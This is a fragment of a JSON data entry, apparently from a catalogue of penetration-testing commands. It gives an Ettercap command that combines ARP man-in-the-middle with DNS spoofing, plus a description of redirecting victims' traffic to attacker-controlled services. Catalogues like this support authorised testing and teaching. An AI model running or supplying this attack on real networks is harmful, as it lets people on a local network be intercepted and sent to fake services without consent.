      "command": "ettercap -T -q -i <interface> -P dns_spoof -M arp //<target>// //<gateway>//",
      "description": "Poisons DNS answers on a local network so victims resolve a domain to your IP. Add the spoofed records to /etc/ettercap/etter.dns, then run Ettercap with the dns_spoof plugin under an ARP MITM to redirect traffic to attacker-controlled services.",
      "platform": "linux",
